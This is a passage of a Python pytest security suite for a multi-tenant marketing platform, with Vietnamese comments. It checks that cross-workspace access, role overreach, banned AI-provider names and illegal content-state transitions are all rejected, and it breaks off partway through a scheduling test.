"""MarketFlow AI — Tier 5 Security, Concurrency & Adversarial Testing Suite.
Milestone 7 Giai đoạn 2: Security & Concurrency Challenger (Challenger 2).

Mục tiêu kiểm thử đối kháng thực tế (Empirical Adversarial Verification):
1. Multi-Tenant Isolation & BOLA/IDOR Hardening across 3 Workspaces & 4 Roles
   (AGENCY_MANAGER, MANAGER, MARKETER, CLIENT_APPROVER).
2. Strict Prohibited Model Directive Enforcement (Claude, GPT, OpenAI, Anthropic, DeepSeek, Llama...)
   returning HTTP 422 Unprocessable Entity.
3. State Machine Adversarial Transitions, Anti-Tampering & Lifecycle Gates.
4. Input Sanitization (XSS, SQLi), Foreign Key Integrity, and Cascade Deletion Verification.
"""

import json
import pytest
from typing import Dict, Any, List
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from sqlalchemy.exc import IntegrityError
from pydantic import ValidationError

from app.core.security import hash_password, create_access_token
from app.core.crypto import encrypt_api_key
from app.models.entities import (
    User, Workspace, WorkspaceMember, BrandKit,
    Campaign, CampaignMember, MarketingContent, ContentReview,
    MarketingSchedule, CampaignMetric, MarketingChannel, CustomApiKey
)
from app.schemas.schemas import AIKeyTestRequest, AIKeyCreate


# ==============================================================================
# Helper Functions & Multi-Workspace Fixture
# ==============================================================================

def make_auth_headers(user_id: int, role: str) -> Dict[str, str]:
    """Tạo JWT Bearer header xác thực hợp lệ cho user_id và role tương ứng."""
    token = create_access_token({"sub": str(user_id), "role": role})
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def multi_workspace_env(db_session: Session):
    """Thiết lập môi trường kiểm thử 3 Không gian làm việc (Workspaces A, B, C) độc lập.
    Mỗi Workspace có đầy đủ:
    - 1 Quản lý Agency (AGENCY_MANAGER / MANAGER)
    - 1 Nhân viên Tiếp thị (MARKETER)
    - 1 Đại diện Phê duyệt Khách hàng (CLIENT_APPROVER)
    - 1 Brand Kit riêng biệt
    - 1 Chiến dịch riêng biệt kèm Content & Metric
    - 1 Khóa Custom AI Key đã mã hóa
    """
    db = db_session

    # --- 1. Tạo Users cho 3 Workspace ---
    # Workspace A Users
    mgr_a = User(email="mgr_a@agency-a.vn", full_name="Manager Workspace A", password_hash=hash_password("Pass@123"), role="AGENCY_MANAGER", status="ACTIVE")
    mkt_a = User(email="mkt_a@agency-a.vn", full_name="Marketer Workspace A", password_hash=hash_password("Pass@123"), role="MARKETER", status="ACTIVE")
    app_a = User(email="app_a@client-a.vn", full_name="Approver Workspace A", password_hash=hash_password("Pass@123"), role="CLIENT_APPROVER", status="ACTIVE")

    # Workspace B Users
    mgr_b = User(email="mgr_b@agency-b.vn", full_name="Manager Workspace B", password_hash=hash_password("Pass@123"), role="AGENCY_MANAGER", status="ACTIVE")
    mkt_b = User(email="mkt_b@agency-b.vn", full_name="Marketer Workspace B", password_hash=hash_password("Pass@123"), role="MARKETER", status="ACTIVE")
    app_b = User(email="app_b@client-b.vn", full_name="Approver Workspace B", password_hash=hash_password("Pass@123"), role="CLIENT_APPROVER", status="ACTIVE")

    # Workspace C Users
    mgr_c = User(email="mgr_c@agency-c.vn", full_name="Manager Workspace C", password_hash=hash_password("Pass@123"), role="AGENCY_MANAGER", status="ACTIVE")
    mkt_c = User(email="mkt_c@agency-c.vn", full_name="Marketer Workspace C", password_hash=hash_password("Pass@123"), role="MARKETER", status="ACTIVE")
    app_c = User(email="app_c@client-c.vn", full_name="Approver Workspace C", password_hash=hash_password("Pass@123"), role="CLIENT_APPROVER", status="ACTIVE")

    db.add_all([mgr_a, mkt_a, app_a, mgr_b, mkt_b, app_b, mgr_c, mkt_c, app_c])
    db.commit()
    for u in (mgr_a, mkt_a, app_a, mgr_b, mkt_b, app_b, mgr_c, mkt_c, app_c):
        db.refresh(u)

    # --- 2. Tạo 3 Workspaces độc lập (ID 2, 3, 4) ---
    ws_a = Workspace(id=2, name="Workspace A Alpha", slug="workspace-a-alpha", description="Agency Workspace A", owner_id=mgr_a.id, status="ACTIVE")
    ws_b = Workspace(id=3, name="Workspace B Beta", slug="workspace-b-beta", description="Agency Workspace B", owner_id=mgr_b.id, status="ACTIVE")
    ws_c = Workspace(id=4, name="Workspace C Gamma", slug="workspace-c-gamma", description="Agency Workspace C", owner_id=mgr_c.id, status="ACTIVE")
    db.add_all([ws_a, ws_b, ws_c])
    db.commit()
    db.refresh(ws_a)
    db.refresh(ws_b)
    db.refresh(ws_c)

    # Thành viên Workspace A
    db.add_all([
        WorkspaceMember(workspace_id=ws_a.id, user_id=mgr_a.id, role="AGENCY_MANAGER"),
        WorkspaceMember(workspace_id=ws_a.id, user_id=mkt_a.id, role="MARKETER"),
        WorkspaceMember(workspace_id=ws_a.id, user_id=app_a.id, role="CLIENT_APPROVER"),
    ])
    # Thành viên Workspace B
    db.add_all([
        WorkspaceMember(workspace_id=ws_b.id, user_id=mgr_b.id, role="AGENCY_MANAGER"),
        WorkspaceMember(workspace_id=ws_b.id, user_id=mkt_b.id, role="MARKETER"),
        WorkspaceMember(workspace_id=ws_b.id, user_id=app_b.id, role="CLIENT_APPROVER"),
    ])
    # Thành viên Workspace C
    db.add_all([
        WorkspaceMember(workspace_id=ws_c.id, user_id=mgr_c.id, role="AGENCY_MANAGER"),
        WorkspaceMember(workspace_id=ws_c.id, user_id=mkt_c.id, role="MARKETER"),
        WorkspaceMember(workspace_id=ws_c.id, user_id=app_c.id, role="CLIENT_APPROVER"),
    ])
    db.commit()

    # --- 3. Tạo Brand Kit cho 3 Workspace ---
    bk_a = BrandKit(workspace_id=ws_a.id, brand_name="Brand A", usp="USP Alpha", tone_of_voice="Chuyên nghiệp", banned_keywords_json='["banned_keyword_a"]')
    bk_b = BrandKit(workspace_id=ws_b.id, brand_name="Brand B", usp="USP Beta", tone_of_voice="Trẻ trung", banned_keywords_json='["banned_keyword_b"]')
    bk_c = BrandKit(workspace_id=ws_c.id, brand_name="Brand C", usp="USP Gamma", tone_of_voice="Sang trọng", banned_keywords_json='["banned_keyword_c"]')
    db.add_all([bk_a, bk_b, bk_c])
    db.commit()
    db.refresh(bk_a)
    db.refresh(bk_b)
    db.refresh(bk_c)

    # --- 4. Tạo Campaigns cho 3 Workspace ---
    camp_a = Campaign(
        id=201, workspace_id=ws_a.id, product_id=1, owner_id=mgr_a.id,
        name="Campaign Alpha of WS A", objective="Mục tiêu WS A", audience="Khách hàng A",
        start_date="2026-09-01", end_date="2026-09-30", budget=10000000.0, status="ACTIVE"
    )
    camp_b = Campaign(
        id=301, workspace_id=ws_b.id, product_id=1, owner_id=mgr_b.id,
        name="Campaign Beta of WS B", objective="Mục tiêu WS B", audience="Khách hàng B",
        start_date="2026-09-01", end_date="2026-09-30", budget=20000000.0, status="ACTIVE"
    )
    camp_c = Campaign(
        id=401, workspace_id=ws_c.id, product_id=1, owner_id=mgr_c.id,
        name="Campaign Gamma of WS C", objective="Mục tiêu WS C", audience="Khách hàng C",
        start_date="2026-09-01", end_date="2026-09-30", budget=30000000.0, status="ACTIVE"
    )
    db.add_all([camp_a, camp_b, camp_c])
    db.commit()
    db.refresh(camp_a)
    db.refresh(camp_b)
    db.refresh(camp_c)

    # Campaign Members
    db.add_all([
        CampaignMember(campaign_id=camp_a.id, user_id=mgr_a.id, member_role="OWNER"),
        CampaignMember(campaign_id=camp_a.id, user_id=mkt_a.id, member_role="CONTRIBUTOR"),
        CampaignMember(campaign_id=camp_b.id, user_id=mgr_b.id, member_role="OWNER"),
        CampaignMember(campaign_id=camp_b.id, user_id=mkt_b.id, member_role="CONTRIBUTOR"),
        CampaignMember(campaign_id=camp_c.id, user_id=mgr_c.id, member_role="OWNER"),
        CampaignMember(campaign_id=camp_c.id, user_id=mkt_c.id, member_role="CONTRIBUTOR"),
    ])
    db.commit()

    # --- 5. Marketing Content cho từng Workspace ---
    cnt_a = MarketingContent(
        id=201, workspace_id=ws_a.id, campaign_id=camp_a.id, channel_id=1, created_by=mkt_a.id,
        title="Nội dung Alpha WS A", body="Bài viết mẫu A", cta="Nhấn A", status="DRAFT", version_no=1
    )
    cnt_b = MarketingContent(
        id=301, workspace_id=ws_b.id, campaign_id=camp_b.id, channel_id=1, created_by=mkt_b.id,
        title="Nội dung Beta WS B", body="Bài viết mẫu B", cta="Nhấn B", status="DRAFT", version_no=1
    )
    cnt_c = MarketingContent(
        id=401, workspace_id=ws_c.id, campaign_id=camp_c.id, channel_id=1, created_by=mkt_c.id,
        title="Nội dung Gamma WS C", body="Bài viết mẫu C", cta="Nhấn C", status="DRAFT", version_no=1
    )
    db.add_all([cnt_a, cnt_b, cnt_c])
    db.commit()
    db.refresh(cnt_a)
    db.refresh(cnt_b)
    db.refresh(cnt_c)

    # --- 6. Metrics cho Campaign B ---
    metric_b = CampaignMetric(
        campaign_id=camp_b.id, channel_id=1, metric_date="2026-09-15",
        views=15000, clicks=750, conversions=45, cost=1500000.0, revenue=6000000.0
    )
    db.add(metric_b)
    db.commit()

    # --- 7. Custom API Keys cho Workspace B ---
    key_b = CustomApiKey(
        user_id=mgr_b.id, workspace_id=ws_b.id, provider="gemini",
        encrypted_key=encrypt_api_key("AIzaSyWorkspaceBSecretKey123"),
        model="gemini-2.5-flash", is_active=True
    )
    db.add(key_b)
    db.commit()
    db.refresh(key_b)

    return {
        "ws_a": ws_a, "ws_b": ws_b, "ws_c": ws_c,
        "mgr_a": mgr_a, "mkt_a": mkt_a, "app_a": app_a,
        "mgr_b": mgr_b, "mkt_b": mkt_b, "app_b": app_b,
        "mgr_c": mgr_c, "mkt_c": mkt_c, "app_c": app_c,
        "camp_a": camp_a, "camp_b": camp_b, "camp_c": camp_c,
        "cnt_a": cnt_a, "cnt_b": cnt_b, "cnt_c": cnt_c,
        "bk_a": bk_a, "bk_b": bk_b, "bk_c": bk_c,
        "key_b": key_b,
        "headers": {
            "mgr_a": make_auth_headers(mgr_a.id, mgr_a.role),
            "mkt_a": make_auth_headers(mkt_a.id, mkt_a.role),
            "app_a": make_auth_headers(app_a.id, app_a.role),
            "mgr_b": make_auth_headers(mgr_b.id, mgr_b.role),
            "mkt_b": make_auth_headers(mkt_b.id, mkt_b.role),
            "app_b": make_auth_headers(app_b.id, app_b.role),
            "mgr_c": make_auth_headers(mgr_c.id, mgr_c.role),
            "mkt_c": make_auth_headers(mkt_c.id, mkt_c.role),
            "app_c": make_auth_headers(app_c.id, app_c.role),
        }
    }


# ==============================================================================
# GROUP 1: MULTI-TENANT ISOLATION & BOLA/IDOR HARDENING (10 Test Cases)
# ==============================================================================

class TestMultiTenantBolaIdorHardening:
    """Tấn công BOLA/IDOR và leo quyền chéo giữa 3 Workspaces và các vai trò khác nhau."""

    def test_01_cross_workspace_campaign_view_idor_blocked(self, client: TestClient, multi_workspace_env):
        """User từ Workspace A (Marketer, Manager, Approver) cố tình truy cập Campaign của Workspace B: Phải bị chặn 403."""
        cid_b = multi_workspace_env["camp_b"].id
        headers = multi_workspace_env["headers"]

        # Marketer A -> Campaign B
        resp_mkt = client.get(f"/api/v1/campaigns/{cid_b}", headers=headers["mkt_a"])
        assert resp_mkt.status_code == 403, f"BOLA Breach: Marketer A accessed Campaign B! Got {resp_mkt.status_code}"

        # Manager A -> Campaign B
        resp_mgr = client.get(f"/api/v1/campaigns/{cid_b}", headers=headers["mgr_a"])
        assert resp_mgr.status_code == 403, f"BOLA Breach: Manager A accessed Campaign B! Got {resp_mgr.status_code}"

        # Approver A -> Campaign B
        resp_app = client.get(f"/api/v1/campaigns/{cid_b}", headers=headers["app_a"])
        assert resp_app.status_code == 403, f"BOLA Breach: Approver A accessed Campaign B! Got {resp_app.status_code}"

    def test_02_cross_workspace_campaign_update_idor_blocked(self, client: TestClient, multi_workspace_env):
        """User từ Workspace A cố tình cập nhật ngân sách/tên Campaign của Workspace B: Phải bị từ chối 403."""
        cid_b = multi_workspace_env["camp_b"].id
        headers = multi_workspace_env["headers"]

        tamper_payload = {"name": "Hacked Campaign B by Attacker A", "budget": 99999999.0}

        resp_mkt = client.put(f"/api/v1/campaigns/{cid_b}", json=tamper_payload, headers=headers["mkt_a"])
        assert resp_mkt.status_code == 403

        resp_mgr = client.put(f"/api/v1/campaigns/{cid_b}", json=tamper_payload, headers=headers["mgr_a"])
        assert resp_mgr.status_code == 403

    def test_03_cross_workspace_campaign_list_leakage_prevented(self, client: TestClient, multi_workspace_env):
        """User từ Workspace A query GET /api/v1/campaigns?workspace_id=3 (Workspace B): Phải bị từ chối 403."""
        headers = multi_workspace_env["headers"]

        resp_mkt = client.get("/api/v1/campaigns?workspace_id=3", headers=headers["mkt_a"])
        assert resp_mkt.status_code == 403

        resp_mgr = client.get("/api/v1/campaigns?workspace_id=3", headers=headers["mgr_a"])
        assert resp_mgr.status_code == 403

        resp_app = client.get("/api/v1/campaigns?workspace_id=3", headers=headers["app_a"])
        assert resp_app.status_code == 403

    def test_04_cross_workspace_ai_context_blocked(self, client: TestClient, multi_workspace_env):
        """User từ Workspace A lợi dụng AI Router (/ai/summary, /ai/draft, /ai/omnichannel) để đọc trộm dữ liệu Campaign B."""
        cid_b = multi_workspace_env["camp_b"].id
        headers = multi_workspace_env["headers"]

        # Marketer A gọi /ai/summary trên Campaign B
        resp_summary = client.post("/api/v1/ai/summary", json={"campaign_id": cid_b}, headers=headers["mkt_a"])
        assert resp_summary.status_code == 403, f"AI Context Leakage: Got {resp_summary.status_code}"

        # Manager A gọi /ai/draft trên Campaign B
        resp_draft = client.post("/api/v1/ai/draft", json={
            "campaign_id": cid_b,
            "channel_code": "facebook",
            "selected_idea": "Chiêu trò quảng cáo"
        }, headers=headers["mgr_a"])
        assert resp_draft.status_code == 403

        # Marketer A gọi /ai/omnichannel với campaign_id của Workspace B
        resp_omni = client.post("/api/v1/ai/omnichannel", json={
            "brief": "Bản tóm tắt chiến dịch tấn công",
            "campaign_id": cid_b
        }, headers=headers["mkt_a"])
        assert resp_omni.status_code == 403

    def test_05_cross_workspace_metrics_kpi_doctor_blocked(self, client: TestClient, multi_workspace_env):
        """User từ Workspace A cố tình xem KPI, báo cáo phân rã và chẩn đoán AI Doctor của Campaign B: Phải bị chặn 403."""
        cid_b = multi_workspace_env["camp_b"].id
        headers = multi_workspace_env["headers"]

        # KPI
        resp_kpi = client.get(f"/api/v1/campaigns/{cid_b}/kpi", headers=headers["mkt_a"])
        assert resp_kpi.status_code == 403

        # Attribution
        resp_attr = client.get(f"/api/v1/campaigns/{cid_b}/attribution", headers=headers["mgr_a"])
        assert resp_attr.status_code == 403

        # AI Doctor
        resp_doc = client.post(f"/api/v1/campaigns/{cid_b}/ai-doctor", headers=headers["mkt_a"])
        assert resp_doc.status_code == 403

    def test_06_cross_workspace_metrics_poisoning_blocked(self, client: TestClient, multi_workspace_env):
        """Tấn công làm sai lệch số liệu (Metrics Poisoning): User A cố tình gửi POST metric vào Campaign B: Phải chặn 403."""
        cid_b = multi_workspace_env["camp_b"].id
        headers = multi_workspace_env["headers"]

        fake_metric_payload = {
            "campaign_id": cid_b,
            "channel_id": 1,
            "metric_date": "2026-09-20",
            "views": 999999,
            "clicks": 99999,
            "conversions": 9999,
            "cost": 1000.0,
            "revenue": 1000000000.0
        }
        resp = client.post(f"/api/v1/campaigns/{cid_b}/metrics", json=fake_metric_payload, headers=headers["mgr_a"])
        assert resp.status_code == 403, f"Metrics poisoning succeeded! Got {resp.status_code}"

    def test_07_cross_workspace_brand_kit_view_and_tamper_blocked(self, client: TestClient, multi_workspace_env):
        """Truy cập và sửa đổi Brand Kit trái phép giữa các Workspace."""
        headers = multi_workspace_env["headers"]

        # Marketer A cố đọc Brand Kit của Workspace B
        resp_view = client.get("/api/v1/brand-kit?workspace_id=3", headers=headers["mkt_a"])
        assert resp_view.status_code == 403

        # Manager A cố ghi đè Brand Kit của Workspace B
        resp_tamper = client.put("/api/v1/brand-kit?workspace_id=3", json={
            "brand_name": "Hacked Brand B",
            "usp": "Phá hoại uy tín thương hiệu B",
            "tone_of_voice": "Bất lịch sự",
            "banned_keywords": ["fake_banned"]
        }, headers=headers["mgr_a"])
        assert resp_tamper.status_code == 403

        # Approver A (trong chính Workspace A) cố sửa Brand Kit Workspace A: Client Approver không có quyền sửa Brand Kit
        resp_app_tamper = client.put("/api/v1/brand-kit?workspace_id=2", json={
            "brand_name": "Tampered by Client Approver"
        }, headers=headers["app_a"])
        assert resp_app_tamper.status_code == 403

    def test_08_cross_workspace_custom_ai_keys_delete_blocked(self, client: TestClient, multi_workspace_env):
        """User từ Workspace A (hoặc Marketer) cố tình xóa Custom AI Key của Workspace B: Phải bị chặn 403."""
        key_b_id = multi_workspace_env["key_b"].id
        headers = multi_workspace_env["headers"]

        # Marketer A cố xóa Key B
        resp_mkt = client.delete(f"/api/v1/settings/ai-keys/{key_b_id}", headers=headers["mkt_a"])
        assert resp_mkt.status_code == 403

        # Approver A cố xóa Key B
        resp_app = client.delete(f"/api/v1/settings/ai-keys/{key_b_id}", headers=headers["app_a"])
        assert resp_app.status_code == 403

    def test_09_rbac_client_approver_restricted_actions(self, client: TestClient, multi_workspace_env):
        """Xác minh giới hạn vai trò CLIENT_APPROVER: Không được tạo chiến dịch hay sửa Brand Kit."""
        headers = multi_workspace_env["headers"]

        # Approver cố tạo chiến dịch
        camp_payload = {
            "product_id": 1,
            "workspace_id": 2,
            "name": "Approver Illegal Campaign",
            "objective": "Tự ý tạo chiến dịch",
            "audience": "Công chúng",
            "start_date": "2026-09-01",
            "end_date": "2026-09-30",
            "budget": 5000000.0
        }
        resp_create = client.post("/api/v1/campaigns", json=camp_payload, headers=headers["app_a"])
        assert resp_create.status_code == 403

    def test_10_rbac_marketer_restricted_workflow_actions(self, client: TestClient, multi_workspace_env):
        """Xác minh giới hạn vai trò MARKETER: Không được tự duyệt (approve), không được tự xuất bản (publish), không được xóa chiến dịch."""
        cnt_a_id = multi_workspace_env["cnt_a"].id
        cid_a = multi_workspace_env["camp_a"].id
        headers = multi_workspace_env["headers"]

        # Marketer tự duyệt bài viết của mình
        resp_app = client.post(f"/api/v1/contents/{cnt_a_id}/approve", headers=headers["mkt_a"])
        assert resp_app.status_code == 403, f"Marketer self-approved content! Got {resp_app.status_code}"

        # Marketer tự xuất bản bài viết
        resp_pub = client.post(f"/api/v1/contents/{cnt_a_id}/publish", headers=headers["mkt_a"])
        assert resp_pub.status_code == 403

        # Marketer cố xóa chiến dịch
        resp_del = client.delete(f"/api/v1/campaigns/{cid_a}", headers=headers["mkt_a"])
        assert resp_del.status_code == 403


# ==============================================================================
# GROUP 2: PROHIBITED MODEL DIRECTIVE ENFORCEMENT (6 Test Cases)
# ==============================================================================

class TestProhibitedModelDirectiveEnforcement:
    """Kiểm tra triệt để việc chặn các nhà cung cấp và mô hình bị cấm (Claude, GPT, OpenAI, Anthropic, DeepSeek, Llama...).
    BẮT BUỘC hệ thống phải từ chối triệt để với HTTP 422 Unprocessable Entity!
    """

    @pytest.mark.parametrize("forbidden_provider", [
        "claude", "anthropic", "openai", "gpt", "deepseek", "llama", "mistral"
    ])
    def test_11_prohibited_provider_test_connection_rejected_422(self, client: TestClient, multi_workspace_env, forbidden_provider):
        """Gửi provider bị cấm vào POST /api/v1/settings/test-ai-connection: BẮT BUỘC trả về HTTP 422."""
        headers = multi_workspace_env["headers"]["mgr_a"]
        payload = {
            "provider": forbidden_provider,
            "api_key": "AIzaSyValidFormatSecretKey123",
            "model": "gemini-2.5-flash"
        }
        resp = client.post("/api/v1/settings/test-ai-connection", json=payload, headers=headers)
        assert resp.status_code == 422, f"Provider {forbidden_provider} was not rejected with 422! Got {resp.status_code}: {resp.text}"

    @pytest.mark.parametrize("forbidden_model", [
        "claude-3-7-sonnet", "gpt-4o", "claude-3-5-sonnet", "claude", "gpt", "sonnet", "deepseek-r1", "llama-3-70b"
    ])
    def test_12_prohibited_model_test_connection_rejected_422(self, client: TestClient, multi_workspace_env, forbidden_model):
        """Gửi model bị cấm vào POST /api/v1/settings/test-ai-connection: BẮT BUỘC trả về HTTP 422."""
        headers = multi_workspace_env["headers"]["mgr_a"]
        payload = {
            "provider": "gemini",
            "api_key": "AIzaSyValidFormatSecretKey123",
            "model": forbidden_model
        }
        resp = client.post("/api/v1/settings/test-ai-connection", json=payload, headers=headers)
        assert resp.status_code == 422, f"Model {forbidden_model} was not rejected with 422! Got {resp.status_code}: {resp.text}"

    @pytest.mark.parametrize("forbidden_provider", [
        "anthropic", "openai", "claude", "gpt", "deepseek", "llama"
    ])
    def test_13_prohibited_provider_save_ai_keys_rejected_422(self, client: TestClient, multi_workspace_env, forbidden_provider):
        """Gửi provider bị cấm vào POST /api/v1/settings/ai-keys: BẮT BUỘC trả về HTTP 422."""
        headers = multi_workspace_env["headers"]["mgr_a"]
        payload = {
            "provider": forbidden_provider,
            "api_key": "AIzaSyValidFormatSecretKey123",
            "model": "gemini-2.5-flash",
            "workspace_id": 2
        }
        resp = client.post("/api/v1/settings/ai-keys", json=payload, headers=headers)
        assert resp.status_code == 422, f"Provider {forbidden_provider} was not rejected with 422! Got {resp.status_code}: {resp.text}"

    @pytest.mark.parametrize("forbidden_model", [
        "claude-3-7-sonnet", "gpt-4o", "claude-3-5-sonnet", "sonnet", "llama-3", "deepseek-coder"
    ])
    def test_14_prohibited_model_save_ai_keys_rejected_422(self, client: TestClient, multi_workspace_env, forbidden_model):
        """Gửi model bị cấm vào POST /api/v1/settings/ai-keys: BẮT BUỘC trả về HTTP 422."""
        headers = multi_workspace_env["headers"]["mgr_a"]
        payload = {
            "provider": "gemini",
            "api_key": "AIzaSyValidFormatSecretKey123",
            "model": forbidden_model,
            "workspace_id": 2
        }
        resp = client.post("/api/v1/settings/ai-keys", json=payload, headers=headers)
        assert resp.status_code == 422, f"Model {forbidden_model} was not rejected with 422! Got {resp.status_code}: {resp.text}"

    @pytest.mark.parametrize("provider_variant,model_variant", [
        ("  ANTHROPIC  ", "gemini-2.5-flash"),
        ("OpenAI", "gemini-2.5-flash"),
        ("gemini", "  CLAUDE-3-7-SONNET  "),
        ("gemini", "GPT-4O"),
        ("gemini", "Claude-3-5-Sonnet"),
        ("cLaUdE", "gemini-2.5-flash"),
        ("gemini", "SoNnEt"),
    ])
    def test_15_prohibited_case_and_padding_variants_rejected_422(self, client: TestClient, multi_workspace_env, provider_variant, model_variant):
        """Thử nghiệm các biến thể chữ hoa, chữ thường và khoảng trắng (whitespace padding): Phải từ chối với 422."""
        headers = multi_workspace_env["headers"]["mgr_a"]
        payload = {
            "provider": provider_variant,
            "api_key": "AIzaSyValidFormatSecretKey123",
            "model": model_variant
        }
        resp1 = client.post("/api/v1/settings/test-ai-connection", json=payload, headers=headers)
        assert resp1.status_code == 422, f"Case/padding evasion succeeded in test-connection: {resp1.status_code}"

        resp2 = client.post("/api/v1/settings/ai-keys", json=payload, headers=headers)
        assert resp2.status_code == 422, f"Case/padding evasion succeeded in ai-keys: {resp2.status_code}"

    @pytest.mark.parametrize("empty_key", [
        "", "   ", "\t\n  \r"
    ])
    def test_16_empty_and_whitespace_key_rejected_422(self, client: TestClient, multi_workspace_env, empty_key):
        """Gửi khóa rỗng hoặc chỉ có khoảng trắng vào endpoints cài đặt AI: Phải từ chối với 422."""
        headers = multi_workspace_env["headers"]["mgr_a"]
        payload = {
            "provider": "gemini",
            "api_key": empty_key,
            "model": "gemini-2.5-flash"
        }
        resp = client.post("/api/v1/settings/test-ai-connection", json=payload, headers=headers)
        assert resp.status_code == 422

        resp_keys = client.post("/api/v1/settings/ai-keys", json=payload, headers=headers)
        assert resp_keys.status_code == 422


# ==============================================================================
# GROUP 3: STATE MACHINE ADVERSARIAL TRANSITIONS & ANTI-TAMPERING (7 Test Cases)
# ==============================================================================

class TestStateMachineAdversarialTransitions:
    """Tấn công máy trạng thái nội dung (Content State Machine) và thử thách tính toàn vẹn."""

    def test_17_illegal_direct_creation_as_approved_or_published(self, client: TestClient, multi_workspace_env):
        """Tấn công tạo bài viết trực tiếp ở trạng thái APPROVED hoặc PUBLISHED qua POST /contents: Bị từ chối 400."""
        headers = multi_workspace_env["headers"]["mkt_a"]
        cid_a = multi_workspace_env["camp_a"].id

        # Thử tạo APPROVED
        resp_app = client.post("/api/v1/contents", json={
            "campaign_id": cid_a,
            "channel_id": 1,
            "title": "Bypass State Machine Approved",
            "body": "Nội dung vượt rào phê duyệt",
            "cta": "Bấm ngay",
            "status": "APPROVED"
        }, headers=headers)
        assert resp_app.status_code == 400, f"Expected 400, got {resp_app.status_code}: {resp_app.text}"

        # Thử tạo PUBLISHED
        resp_pub = client.post("/api/v1/contents", json={
            "campaign_id": cid_a,
            "channel_id": 1,
            "title": "Bypass State Machine Published",
            "body": "Nội dung vượt rào xuất bản",
            "cta": "Bấm ngay",
            "status": "PUBLISHED"
        }, headers=headers)
        assert resp_pub.status_code == 400

    def test_18_illegal_direct_update_to_approved_or_published(self, client: TestClient, multi_workspace_env):
        """Tấn công chuyển trạng thái trực tiếp sang APPROVED hoặc PUBLISHED qua PUT /contents/{id}: Bị từ chối 400."""
        cnt_a_id = multi_workspace_env["cnt_a"].id
        headers = multi_workspace_env["headers"]["mkt_a"]

        resp_app = client.put(f"/api/v1/contents/{cnt_a_id}", json={"status": "APPROVED"}, headers=headers)
        assert resp_app.status_code == 400

        resp_pub = client.put(f"/api/v1/contents/{cnt_a_id}", json={"status": "PUBLISHED"}, headers=headers)
        assert resp_pub.status_code == 400

    def test_19_illegal_approve_without_in_review_status(self, client: TestClient, multi_workspace_env):
        """Phê duyệt bài viết khi chưa qua bước gửi duyệt (bài viết đang ở DRAFT): Phải bị từ chối 400."""
        cnt_a_id = multi_workspace_env["cnt_a"].id
        headers = multi_workspace_env["headers"]["mgr_a"]

        # Bài viết cnt_a hiện đang là DRAFT
        resp = client.post(f"/api/v1/contents/{cnt_a_id}/approve", headers=headers)
        assert resp.status_code == 400, f"Approved content from DRAFT state! Got {resp.status_code}"

    def test_20_illegal_publish_without_approved_status(self, client: TestClient, multi_workspace_env):
        """Xuất bản bài viết chưa được phê duyệt (đang ở DRAFT hoặc IN_REVIEW): Phải bị từ chối 400."""
        cnt_a_id = multi_workspace_env["cnt_a"].id
        headers = multi_workspace_env["headers"]["mgr_a"]

        # Khi ở DRAFT
        resp_draft = client.post(f"/api/v1/contents/{cnt_a_id}/publish", headers=headers)
        assert resp_draft.status_code == 400

        # Chuyển sang IN_REVIEW
        submit_resp = client.post(f"/api/v1/contents/{cnt_a_id}/submit", headers=multi_workspace_env["headers"]["mkt_a"])
        assert submit_resp.status_code == 200

        # Khi ở IN_REVIEW nhưng chưa APPROVED
        resp_in_review = client.post(f"/api/v1/contents/{cnt_a_id}/publish", headers=headers)
        assert resp_in_review.status_code == 400

    def test_21_anti_tampering_modifying_approved_content_resets_to_draft(self, client: TestClient, multi_workspace_env):
        """Chống can thiệp sau duyệt (Anti-Tampering): Sửa bài viết đã APPROVED phải tự động hạ về AI_DRAFT và tăng version_no."""
        cnt_a_id = multi_workspace_env["cnt_a"].id
        mkt_headers = multi_workspace_env["headers"]["mkt_a"]
        mgr_headers = multi_workspace_env["headers"]["mgr_a"]

        # Đưa bài viết lên APPROVED hợp lệ qua luồng
        client.post(f"/api/v1/contents/{cnt_a_id}/submit", headers=mkt_headers)
        app_resp = client.post(f"/api/v1/contents/{cnt_a_id}/approve", headers=mgr_headers)
        assert app_resp.status_code == 200
        assert app_resp.json()["status"] == "APPROVED"

        # Marketer lén sửa đổi nội dung đã duyệt
        tamper_resp = client.put(f"/api/v1/contents/{cnt_a_id}", json={
            "title": "Tiêu đề sau khi đã lén sửa đổi",
            "body": "Nội dung sửa đổi bí mật",
            "cta": "Bấm vào link xấu"
        }, headers=mkt_headers)
        assert tamper_resp.status_code == 200
        tampered_data = tamper_resp.json()

        # BẮT BUỘC trạng thái phải bị giáng cấp về AI_DRAFT và version_no tăng lên
        assert tampered_data["status"] == "AI_DRAFT", f"Anti-tampering failed! Status remained: {tampered_data['status']}"
        assert tampered_data["version_no"] >= 2

    def test_22_anti_tampering_modifying_published_content_resets_to_draft(self, client: TestClient, multi_workspace_env):
        """Sửa bài viết đã PUBLISHED cũng bắt buộc phải bị hạ về AI_DRAFT để ngăn chặn sửa bài đã lên sóng mà không qua duyệt lại."""
        cnt_a_id = multi_workspace_env["cnt_a"].id
        mkt_headers = multi_workspace_env["headers"]["mkt_a"]
        mgr_headers = multi_workspace_env["headers"]["mgr_a"]

        # Đưa bài viết lên APPROVED rồi PUBLISHED
        client.post(f"/api/v1/contents/{cnt_a_id}/submit", headers=mkt_headers)
        client.post(f"/api/v1/contents/{cnt_a_id}/approve", headers=mgr_headers)
        pub_resp = client.post(f"/api/v1/contents/{cnt_a_id}/publish", headers=mgr_headers)
        assert pub_resp.status_code == 200
        assert pub_resp.json()["status"] == "PUBLISHED"

        # Sửa bài PUBLISHED
        edit_resp = client.put(f"/api/v1/contents/{cnt_a_id}", json={
            "body": "Nội dung bài viết PUBLISHED bị thay đổi trái phép"
        }, headers=mgr_headers)
        assert edit_resp.status_code == 200
        assert edit_resp.json()["status"] == "AI_DRAFT"

    def test_23_schedule_unapproved_content_blocked(self, client: TestClient, multi_workspace_env):
        """Lịch đăng (Marketing Calendar) chỉ cho phép lên lịch đối với bài viết đã được phê duyệt (APPROVED)."""
        cnt_a_id = multi_workspace_env["cnt_a"].id
        mkt_headers = multi_workspace_env["headers"]["mkt_a"]
        mgr_headers = multi_workspace_env["headers"]["mgr_a"]

        schedule_payload = {
            "content_id": cnt_a_id,
            "scheduled_at": "2026-10-01T10:00:00Z",
            "timezone": "Asia/Ho_Chi_Minh"
        }

        # 1. Thử lập lịch khi đang ở DRAFT: Phải từ chối 400
        resp_draft = client.post(f"/api/v1/contents/{cnt_a_id}/schedule", json=schedule_payload, headers=mkt_headers)
